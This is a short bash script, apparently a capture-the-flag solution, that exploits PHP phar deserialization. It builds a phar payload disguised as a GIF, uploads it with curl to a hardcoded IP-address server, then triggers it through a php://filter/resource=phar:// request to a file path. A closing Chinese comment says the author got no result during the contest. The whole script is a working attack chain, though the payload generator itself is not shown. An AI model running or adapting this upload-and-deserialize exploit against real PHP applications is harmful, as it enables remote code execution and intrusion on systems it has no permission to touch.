#!/usr/bin/env bash

# Author : Virink <virink@outlook.com>
# Date   : 2019/08/18, 20:17

# cat exp.gif

php -d phar.readonly=0 gen_phar.php 1

curl -s -q -k "http://47.111.59.243:9025/index.php" -F upload=1 -F file=@exp.gif

curl -s -q -k "http://47.111.59.243:9025/func.php" -F submit=1 -F php://filter/resource=phar:///var/www/html/upload/b014c6955563f4707974a5dbfbc82632/13b660df3dceb26dd27fa61366754d83.gif/v.txt

rm exp.gif

# 比赛的时候一直收不到，，，我也很绝望，，，BTW, 音乐不错。。。
